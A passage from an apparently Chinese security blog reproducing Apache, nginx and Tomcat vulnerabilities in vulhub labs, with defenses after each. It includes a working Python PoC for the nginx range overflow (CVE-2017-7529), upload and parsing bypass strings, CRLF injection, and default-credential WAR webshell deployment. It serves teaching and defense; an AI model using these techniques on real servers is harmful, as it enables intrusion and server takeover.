<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;.(php.|php3.|php4.|php5.)&quot;&gt;</span><br><span class="line">Order Deny,Allow </span><br><span class="line">Deny from all </span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>把配置不当的文件进行修改</p>
</li>
</ol>
<h2 id="目录遍历漏洞"><a href="#目录遍历漏洞" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p><strong>原理</strong></p>
<p>当客户端访问到一个目录时，Apache服务器将会默认寻找一个index list中的文件，若文件不存在，则会列出当前目录下所有文件或返回403状态码，而列出目录下所有文件的行为称为目录遍历。</p>
<h3 id="复现-9"><a href="#复现-9" class="headerlink" title="复现"></a>复现</h3><p>由于配置文件http.conf设置不当，造成漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220514221022919.png" alt="image-20220514221022919" style="zoom:80%;">

<p>可以访问到admin文件夹下的文件</p>
<img src="/2022/05/10/22-0510-01/image-20220514220844796.png" alt="image-20220514220844796" style="zoom:80%;">

<h3 id="防御-9"><a href="#防御-9" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成Options -Indexes + FollowSymLinks + ExecCGI并保存（把+修改为-）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">+ Indexes 允许目录浏览 </span><br><span class="line">— Indexes 禁止目录浏览</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Apache-HTTPD-换行解析漏洞（CVE-2017-15715）"><a href="#Apache-HTTPD-换行解析漏洞（CVE-2017-15715）" class="headerlink" title="Apache HTTPD 换行解析漏洞（CVE-2017-15715）"></a>Apache HTTPD 换行解析漏洞（CVE-2017-15715）</h2><p>Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\x0a将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
<h3 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h3><p>复现采用vulhub环境进行复现</p>
<img src="/2022/05/10/22-0510-01/image-20220515142615104.png" alt="image-20220515142615104" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220515144112164.png" alt="image-20220515144112164" style="zoom:80%;">

</p><p>

</p><p>上传1.php（1.php里的内容为<code>&lt;?php phpinfo(); ?&gt;</code>），无法直接上传成功</p>
<img src="/2022/05/10/22-0510-01/image-20220515143358878.png" alt="image-20220515143358878" style="zoom:80%;">

<p>在evil.php后面加上<code>.</code></p>
<img src="/2022/05/10/22-0510-01/image-20220515144249485.png" alt="image-20220515144249485" style="zoom:80%;">

<p>将对应点的十六进制（2e）改成0a</p>
<img src="/2022/05/10/22-0510-01/image-20220515144355347.png" alt="image-20220515144355347" style="zoom:80%;">

<p>访问已经可以成功解析</p>
<img src="/2022/05/10/22-0510-01/image-20220515144933934.png" alt="image-20220515144933934" style="zoom:80%;">

<h3 id="防御-10"><a href="#防御-10" class="headerlink" title="防御"></a>防御</h3><ol>
<li>升级到最新版本</li>
<li>将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行</li>
</ol>
<h1 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h1><p><strong>介绍</strong></p>
<p>Nginx是一款轻量级的Web 服务器&#x2F;反向代理服务器及电子邮件（IMAP&#x2F;POP3）代理服务器，在BSD-like协议下发行。其特点是占有内存少，并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好。</p>
<h2 id="文件解析漏洞-1"><a href="#文件解析漏洞-1" class="headerlink" title="文件解析漏洞"></a>文件解析漏洞</h2><p>该漏洞是由于Nginx中php配置不当而造成的，与Nginx版本无关，但在高版本的php中，由于<code>security.limit_extensions</code>的引入，使得该漏洞难以被成功利用。</p>
<h3 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h3><p>环境使用nginx、php5.2.7</p>
<img src="/2022/05/10/22-0510-01/image-20220515172227390.png" alt="image-20220515172227390" style="zoom:80%;">

<p>目标网站下有1.jpg，内容如下</p>
<img src="/2022/05/10/22-0510-01/image-20220515172320253.png" alt="image-20220515172320253" style="zoom:80%;">

<p>然后访问不存在的xxx.php，导致1.jpg被解析成php文件</p>
<img src="/2022/05/10/22-0510-01/image-20220515172403063.png" alt="image-20220515172403063" style="zoom:80%;">

<p><strong>原因分析</strong></p>
<p>Nginx拿到URI为&#x2F;1.jpg&#x2F;xxx.php后，识别处后缀是.php，认为是php文件，转交给PHP FastCGI处理程序去处理。PHP FastCGI处理程序识别该URI： &#x2F;1.jpg&#x2F;xxx.php不存在，<code>按照PHP FastCGI处理程序自己的规则，删去最后的/xxx.php</code>，又看&#x2F;1.jpg存在，就将&#x2F;1.jpg当成要执行的文件，就成功解析。</p>
<p>上面对于有句话“<code>按照PHP FastCGI处理程序自己的规则，删去最后的/xxx.php</code>”，这里能够删去最后的&#x2F;xxx.php，实际是因为<code>cgi.fix_pathinfo</code>的作用，cgi.fix_pathinfo 默认值为 1，其作用就是修复URI路径，比如：1.jpg&#x2F;xxx.php，当&#x2F;xxx.php不存在时，会删除&#x2F;xxx.php，，然后继续判断1.jpg是否存在，如果存在就把 1.jpg 当作 &#x2F;1.jpg&#x2F;xxx.php </p>
<h3 id="防御-11"><a href="#防御-11" class="headerlink" title="防御"></a>防御</h3><ol>
<li>将php.ini文件中的cgi.fix_pathinfo的值设置为0,这样php再解析1.php&#x2F;1.jpg这样的目录时,只要1.jpg不存在就会显示404页面</li>
<li>php-fpm.conf中的security.limit_extensions后面的值设置为.php</li>
</ol>
<h2 id="目录遍历漏洞-1"><a href="#目录遍历漏洞-1" class="headerlink" title="目录遍历漏洞"></a>目录遍历漏洞</h2><p>Nginx的目录遍历与apache一样,属于配置方面的问题,错误的配置可导致目录遍历与源码泄露。</p>
<h3 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h3><img src="/2022/05/10/22-0510-01/image-20220515174718527.png" alt="image-20220515174718527" style="zoom:80%;">

<p>在nginx.conf配置文件中修改off为on后，即可造成漏洞</p>
<img src="/2022/05/10/22-0510-01/image-20220515174806807.png" alt="image-20220515174806807" style="zoom:80%;">

<p>

<img src="/2022/05/10/22-0510-01/image-20220515174853697.png" alt="image-20220515174853697" style="zoom:80%;">

</p><h3 id="防御-12"><a href="#防御-12" class="headerlink" title="防御"></a>防御</h3><ol>
<li>设置 autoindex off 关闭目录浏览</li>
<li>删除 autoindex on</li>
</ol>
<h2 id="空字节代码执行漏洞"><a href="#空字节代码执行漏洞" class="headerlink" title="空字节代码执行漏洞"></a>空字节代码执行漏洞</h2><p>在使用PHP-FastCGI执行php的时候，URL里面在遇到%00空字节时与FastCGI处理不一致，导致可在非php文件中嵌入php代码，通过访问url+%00.php来执行其中的php代码。例如：目标网站中有1.jpg，1.jpg的内容为<code>&lt;?php phpinfo();?&gt;</code>，然后如果该网站存在漏洞，即可通过访问<code>http://目标网站ip/1.jpg%00.php</code>，使1.jpg解析成php</p>
<p>影响版本：</p>
<ul>
<li>nginx 0.5.*</li>
<li>nginx 0.6.* </li>
<li>nginx 0.7 &lt;&#x3D; 0.7.65</li>
<li>nginx 0.8 &lt;&#x3D; 0.8.37</li>
</ul>
<h3 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a>复现</h3><p>这里没有找到相关环境，大致思路如下：</p>
<p>访问<code>http://目标网站/1.jpg..</code> burp抓包（为啥不访问1.jpg，因为1.jpg用burpsuite可能抓不到）</p>
<p>然后把<code>1.jpg..</code>中jpg后面第一个点对应的十六进制改成00即可</p>
<h3 id="防御-13"><a href="#防御-13" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>升级 nginx</p>
</li>
<li><p>在nginx虚拟机配置或者fcgi.conf配置加如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if ($request_filename ~* (.*)\.php) &#123;</span><br><span class="line">	set $php_url $1;</span><br><span class="line">&#125;</span><br><span class="line">if (!-e $php_url.php) &#123;</span><br><span class="line">	return 403;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="整数溢出漏洞（CVE-2017-7529）"><a href="#整数溢出漏洞（CVE-2017-7529）" class="headerlink" title="整数溢出漏洞（CVE-2017-7529）"></a>整数溢出漏洞（CVE-2017-7529）</h2><p>在 Nginx 的 range filter 中存在整数溢出漏洞，可以通过带有特殊构造的 range 的 HTTP 头的恶意请求引发这个整数溢出漏洞，并导致信息泄露。</p>
<p>该漏洞影响所有 <code>0.5.6 - 1.13.2</code> 版本内默认配置模块的Nginx只需要开启缓存攻击者即可发送恶意请求进行远程攻击造成信息泄露。当Nginx服务器使用代理缓存的情况下攻击者通过利用该漏洞可以拿到服务器的后端真实IP或其他敏感信息。</p>
<p>通过我们的分析判定该漏洞利用难度低可以归属于low-hanging-fruit的漏洞在真实网络攻击中也有一定利用价值。</p>
<h3 id="复现-14"><a href="#复现-14" class="headerlink" title="复现"></a>复现</h3><p><a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/blob/master/nginx/CVE-2017-7529/poc.py">https://github.com/vulhub/vulhub/blob/master/nginx/CVE-2017-7529/poc.py</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/baidu_38844729/article/details/105216926">https://blog.csdn.net/baidu_38844729/article/details/105216926</a></p>
<p>漏洞检测脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s url&quot;</span> % (sys.argv[<span class="number">0</span>]))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;eg: python %s http://your-ip:8080/&quot;</span> % (sys.argv[<span class="number">0</span>]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">offset = <span class="number">605</span></span><br><span class="line">url = sys.argv[<span class="number">1</span>]</span><br><span class="line">file_len = <span class="built_in">len</span>(requests.get(url, headers=headers).content)</span><br><span class="line">n = file_len + offset</span><br><span class="line">headers[<span class="string">&#x27;Range&#x27;</span>] = <span class="string">&quot;bytes=-%d,-%d&quot;</span> % (</span><br><span class="line">    n, <span class="number">0x8000000000000000</span> - n)</span><br><span class="line"></span><br><span class="line">r = requests.get(url, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure>

<h3 id="防御-14"><a href="#防御-14" class="headerlink" title="防御"></a>防御</h3><ol>
<li>升级版本</li>
</ol>
<h2 id="CRLF注入漏洞"><a href="#CRLF注入漏洞" class="headerlink" title="CRLF注入漏洞"></a>CRLF注入漏洞</h2><p>Nginx将传入的url进行解码，对其中的%0a%0d替换成换行符，导致后面的数据注入至头部，造成CRLF注入漏洞。</p>
<h3 id="复现-15"><a href="#复现-15" class="headerlink" title="复现"></a>复现</h3><p>在nginx配置文件中添加如下内容</p>
<img src="/2022/05/10/22-0510-01/image-20220515182946049.png" alt="image-20220515182946049" style="zoom:80%;">

<p><code>return 302 https://$host$uri;</code> 的目的是让http请求跳转到https请求。其中<code>$uri</code>就是我们的访问的地址，该变量可控。其中<code>https://$host$uri</code>会出现在http响应报文中，这样我们就可以通过改变<code>$uri</code>来控制http的响应报文。</p>
<p>当我们正常访问<code>http://192.168.13.159</code>时，抓包，然后发送，发现nginx重定向（302）后，在http响应头中出现Location字段，如下图所示：</p>
<img src="/2022/05/10/22-0510-01/image-20220515183555255.png" alt="image-20220515183555255" style="zoom:80%;">

<p>踩坑特别注意：不知道为啥，我们再次访问192.168.13.159的时候，竟然无法访问了，但是我们把nginx配置文件中的 return 302 https:&#x2F;&#x2F;$host$uri; 删除，然后再重启phpstudy后，即可再次访问网站</p>
<p>访问<code>http://192.168.13.159/%0d%0atest</code>，<code>%0d%0a</code>即<code>\r\n</code>也就是换行符，访问后如下图，即在url中加入一个换行符即可将恶意数据写入http响应头</p>
<img src="/2022/05/10/22-0510-01/image-20220515184737071.png" alt="image-20220515184737071" style="zoom:80%;">

<p>基于该原理，我们还可以插入恶意的js代码，造成xss</p>
<h3 id="防御-15"><a href="#防御-15" class="headerlink" title="防御"></a>防御</h3><ol>
<li>删除配置不当的配置</li>
</ol>
<h2 id="文件名逻辑漏洞（CVE-2013-4547）"><a href="#文件名逻辑漏洞（CVE-2013-4547）" class="headerlink" title="文件名逻辑漏洞（CVE-2013-4547）"></a>文件名逻辑漏洞（CVE-2013-4547）</h2><p>这一漏洞的原理是非法字符空格和截止符（\0）会导致Nginx解析URI时的有限状态机混乱，此漏洞可导致目录跨越及代码执行</p>
<p>影响版本为：nginx 0.8.41 – 1.5.6</p>
<h3 id="复现-16"><a href="#复现-16" class="headerlink" title="复现"></a>复现</h3><p>复现环境采用vulhub</p>
<img src="/2022/05/10/22-0510-01/image-20220515195807069.png" alt="image-20220515195807069" style="zoom: 80%;">

<p>上传1.php失败，因为后端做了过滤，如下，限制了我们上传php|php3|php5|phtml</p>
<img src="/2022/05/10/22-0510-01/image-20220515200128047.png" alt="image-20220515200128047" style="zoom:80%;">

<p>我们上传1.jpg，其内容为 <code>&lt;?php phpinfo();?&gt;</code>，可以上传成功</p>
<img src="/2022/05/10/22-0510-01/image-20220515200533446.png" alt="image-20220515200533446" style="zoom:80%;">



<p>上传成功之后，我们通过GET方式来访问下1.jpg</p>
<img src="/2022/05/10/22-0510-01/image-20220515200949449.png" alt="image-20220515200949449" style="zoom:80%;">

<p>由于nginx把所有后缀为php的文件都交给fastcgi处理，配合前面的文件解析漏洞，我们访问1.jpg&#x2F;xxx.php，看下尝试能不能让jpg文件解析成php（直接失败，这里cgi.fix_pathinfo的值为0导致）</p>
<img src="/2022/05/10/22-0510-01/image-20220515201049681.png" alt="image-20220515201049681" style="zoom:80%;">

<p>同样尝试00截断，通过GET方式访问1.jpg%00.php，由于.php后缀，那么会将1.jpg%00.php，发送给fastcgi，然后再00截断，fastcgi得到1.jpg，把1.jpg解析成php，但是想法很好，也失败了，如下</p>
<img src="/2022/05/10/22-0510-01/image-20220515201456463.png" alt="image-20220515201456463" style="zoom:80%;">

<p>但是为啥00截断失败了呢？？通过大量调试，发现当nginx发现文件名中存在\0截断符时会返回错误信息代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">case &#x27;\0&#x27;:  </span><br><span class="line">	return NGX_HTTP_PARSE_INVALID_REQUEST;</span><br></pre></td></tr></table></figure>

<p>调试代码发现，如果nginx发现URI中存在空格，则会直接跳过，注意：截断符号\0虽然与空格不同，但是恰巧打印输出出来就是空格，对于上面的<code>/uploadfiles/1.jpg%00.php</code>，url中的%00截断符也就是&#x2F;0，打印出来就是空格，而%00后面是<code>.</code>，压根不是空格，那么根据下面的代码，就会输出<code>return NGX_HTTP_PARSE_INVALID_REQUEST;</code></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该段代码参考自：https://blog.csdn.net/oyw5201314ck/article/details/78550785</span></span><br><span class="line"><span class="keyword">case</span> sw_http_09:</span><br><span class="line">            <span class="comment">// 当前状态为解析URL后紧跟空格后的内容</span></span><br><span class="line">            <span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">                <span class="comment">// 如果当前字符为空格, 直接跳过</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> CR:</span><br><span class="line">                <span class="comment">// 如果当前字符为\r, 说明是HTTP 0.9</span></span><br><span class="line">                <span class="comment">// 置r-&gt;http_minor为9</span></span><br><span class="line">                r-&gt;http_minor = <span class="number">9</span>;</span><br><span class="line">                <span class="comment">// 置state为sw_almost_done, 表示解析结束的\n</span></span><br><span class="line">                state = sw_almost_done;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> LF:</span><br><span class="line">                <span class="comment">// 如果当前字符为\n, 说明是HTTP 0.9</span></span><br><span class="line">                <span class="comment">// 置r-&gt;http_minor为9</span></span><br><span class="line">                r-&gt;http_minor = <span class="number">9</span>;</span><br><span class="line">                <span class="comment">// 置state为sw_done, 表示解析完成</span></span><br><span class="line">                state = sw_done;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;H&#x27;</span>:</span><br><span class="line">                <span class="comment">// 如果当前字符是H, 说明是HTTP &gt;= 1.0</span></span><br><span class="line">                <span class="comment">// 置state为sw_http_H, 表示解析协议版本的第二个字符T</span></span><br><span class="line">                state = sw_http_H;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// 当前字符为其他字符, 返回NGX_HTTP_PARSE_INVALID_REQUEST</span></span><br><span class="line">                <span class="keyword">return</span> NGX_HTTP_PARSE_INVALID_REQUEST;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure>

<p>基于上述原理，我们只需要在%00截断符之前加上一个空格就行了呀</p>
<p>所以直接上传1.jpg （注意1.jpg后面有个空格），这样服务器中就有了1.jpg（注意1.jpg后有个空格），在windows中文件后缀名中的空格会自动删除，但是linux中并不会删除空格，会保留</p>
<img src="/2022/05/10/22-0510-01/image-20220515204945608.png" alt="image-20220515204945608" style="zoom:80%;">

<p>然后通过GET访问1.php %00.php（注意php和%00之间有空格）</p>
<img src="/2022/05/10/22-0510-01/image-20220515205317799.png" alt="image-20220515205317799" style="zoom:80%;">



<h3 id="防御-16"><a href="#防御-16" class="headerlink" title="防御"></a>防御</h3><ol>
<li>升级nginx</li>
</ol>
<h1 id="tomcat"><a href="#tomcat" class="headerlink" title="tomcat"></a>tomcat</h1><p>tomcat是一个开源而且免费的jsp服务器，属于轻量级应用服务器。它可以实现JavaWeb程序的装载，是配置JSP（Java Server Page）和JAVA系统必备的一款环境。</p>
<h2 id="Tomcat-远程代码执行漏洞（CVE-2017-12615）"><a href="#Tomcat-远程代码执行漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat 远程代码执行漏洞（CVE-2017-12615）"></a>Tomcat 远程代码执行漏洞（CVE-2017-12615）</h2><p>当 Tomcat运行在Windows操作系统时，且启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。</p>
<p><strong>原理</strong></p>
<p>CVE-2017-12615影响范围： Apache Tomcat 7.0.0 - 8.5.19</p>
<p>当在Tomcat的conf（配置目录下）&#x2F;web.xml配置文件中添加readonly设置为false时，将导致该漏洞产生，（需要允许put请求）</p>
<img src="/2022/05/10/22-0510-01/image-20220523193109437.png" alt="image-20220523193109437" style="zoom:80%;">

<h3 id="复现-17"><a href="#复现-17" class="headerlink" title="复现"></a>复现</h3><p>复现采用vulhub靶场进行复现，启动环境后，进入环境中，查看web.xml，发现确实为false</p>
<img src="/2022/05/10/22-0510-01/image-20220523195612204.png" alt="image-20220523195612204" style="zoom:80%;">

<p>用burp抓包，并且可以成功上传jsp脚本</p>
<img src="/2022/05/10/22-0510-01/image-20220523203702519.png" alt="image-20220523203702519" style="zoom:80%;">

<p>用冰蝎可以连接</p>
<img src="/2022/05/10/22-0510-01/image-20220523203751777.png" alt="image-20220523203751777" style="zoom:80%;">

<p>注意：支持三种上传绕过方式默认使用put 加文件名是失败的需要绕过，绕过方法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PUT/shell.jsp%20</span><br><span class="line">PUT/shell.jsp::$DATA </span><br><span class="line">PUT/shell.jsp/</span><br></pre></td></tr></table></figure>

<h3 id="防御-17"><a href="#防御-17" class="headerlink" title="防御"></a>防御</h3><ol>
<li>设置 readonly未true</li>
</ol>
<h2 id="tomcat-弱口令-amp-war远程部署"><a href="#tomcat-弱口令-amp-war远程部署" class="headerlink" title="tomcat 弱口令&amp;war远程部署"></a>tomcat 弱口令&amp;war远程部署</h2><p><strong>原理</strong></p>
<p>在tomcat8环境下默认进入后台的密码为tomcat&#x2F;tomcat，未修改造成未授权即可进入后台，或者管理员把密码设置成弱口令，使用工具对其进行穷举。得到密码后，也可以进行后台上传恶意代码控制服务器。</p>
<h3 id="复现-18"><a href="#复现-18" class="headerlink" title="复现"></a>复现</h3><p>环境采用vulhub</p>
<img src="/2022/05/10/22-0510-01/image-20220523205505130.png" alt="image-20220523205505130" style="zoom:80%;">

<p>默认密码为tomcat</p>
<img src="/2022/05/10/22-0510-01/image-20220523205533465.png" alt="image-20220523205533465" style="zoom:80%;">

<p>然后选择上传war包，把冰蝎自带的shell.jsp压缩成shell.war，然后上传即可</p>
<img src="/2022/05/10/22-0510-01/image-20220523205803598.png" alt="image-20220523205803598" style="zoom:80%;">

<p>上传成功后</p>
<img src="/2022/05/10/22-0510-01/image-20220523205847854.png" alt="image-20220523205847854" style="zoom:80%;">

<p>然后连接即可</p>
<img src="/2022/05/10/22-0510-01/image-20220523205944498.png" alt="image-20220523205944498" style="zoom:80%;">

<h3 id="防御-18"><a href="#防御-18" class="headerlink" title="防御"></a>防御</h3><ol>
<li><p>设置强口令</p>
<p>conf&#x2F;tomcat-users.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;userusername=&quot;tomcat&quot;password=&quot;tomcat&quot;roles=&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;/&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>删除manger文件</p>
</li>
</ol>
<h2 id="tomcat-远程代码执行-CVE-2019-0232"><a href="#tomcat-远程代码执行-CVE-2019-0232" class="headerlink" title="tomcat 远程代码执行(CVE-2019-0232)"></a><strong>tomcat</strong> 远程代码执行(CVE-2019-0232)</h2><p>Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。4月11日，Apache官方发布通告称将在最新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击，触发该漏洞需要同时满足以下条件：</p>
<ol>
<li>系统为Windows</li>
<li>启用了CGI Servlet（默认为关闭）</li>
<li>启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭）</li>
</ol>
<p>影响范围：</p>
<p>Apache  Tomcat  9.0.0.M1  to  9.0.17</p>
<p>Apache  Tomcat  8.5.0  to  8.5.39</p>
<p>Apache  Tomcat  7.0.0  to  7.0.93</p>
<h1 id="jboss"><a href="#jboss" class="headerlink" title="jboss"></a>jboss</h1><h1 id="weblogic"><a href="#weblogic" class="headerlink" title="weblogic"></a>weblogic</h1>
        </div>		
		
        <section class="post-tags">
            <div>
                <span>标签:</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="/">
                    <i class="iconfont icon-home"></i>
                    主页
                </a>
                <span>· </span>
                <a href="javascript:window.history.back();">
                    <i class="iconfont icon-back"></i>
                    返回
                </a>
                
                
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/05/12/22-0512-01/">MSF常用命令集合</a>
            
            
            <a class="next" rel="next" href="/2022/05/09/22-0509-01/">ATT&CK—红队评估1</a>
            
        </section>
        <br>
        
            <section id="comments" class="comments">
              <style>
                  .comments{ margin-top: 30px;}
                  .v .vlist .vcard .vcontent {padding-top: 0;}
                  .vcontent p { color:grey; margin-bottom: 10px;}
                  .v * {line-height: normal;}
                  .v .vwrap  {border-radius: 0px; padding: 10px;}
                  .v .vbtn {border-radius: 0px;}
                  .v code, .v pre {border-radius: 0px;}
                  .v .vlist .vcard .vhead .vsys {border-radius: 1px; padding: 2px;}
                  .v .vlist .vcard .vhead .vnick {color: #2d96bd;}
                  .v .vlist .vcard .vh .vmeta .vat{color: #c7254e;}
                  .v .vlist .vcard {padding-top: 0;}
                  .v .vlist .vcard .vimg { width: 2.5em; height: 2.5em; }
                  .v .vlist .vcard .vquote .vimg { width: 2.5em; height: 2.5em; }
              </style>
              <div class="valine_comment"></div>
<!--载入js，在</body>之前插入即可-->
<!--Leancloud 操作库:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine 的核心代码库-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
    new Valine({
        app_id: 'baahrwTTyOayDYUv5AtkdGJj-gzGzoHsz',
        app_key: 'iTfzn8X60g9v0zTtnvToc09l',
        placeholder: '想对作者说点什么...',
        notify: 'false',
        verify: 'false',
        avatar: 'retro',
        visitor: 'true'
    });
</script>
            </section>
        
    </article>
</div>



<style>

.post-wrap { table-layout:fixed; word-break:break-all; overflow:hidden; }

</style>
        </div>
        <footer id="footer" class="footer">

 <div class="copyright">

 <span>© 𝐴_𝑌𝑢

 <!-- 访客数量 -->

 

 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<span class="site-uv">
    | 总访客量:
    <i class="busuanzi-value" id="busuanzi_value_site_uv"><i class="fa fa-spinner fa-spin"></i></i>
</span>&nbsp;


<span class="site-pv">
    | 总访问量:
    <i class="busuanzi-value" id="busuanzi_value_site_pv"><i class="fa fa-spinner fa-spin"></i></i>
</span>


 

 </span>

 </div>

</footer>
    </div>
</body>
</html>


	



<script type="text/javascript" src="\js\jquery.js"></script>
<script type="text/javascript" src="\js\jquery.min.js"></script>

<script  type="text/javascript" src="\js\snow.js"></script>

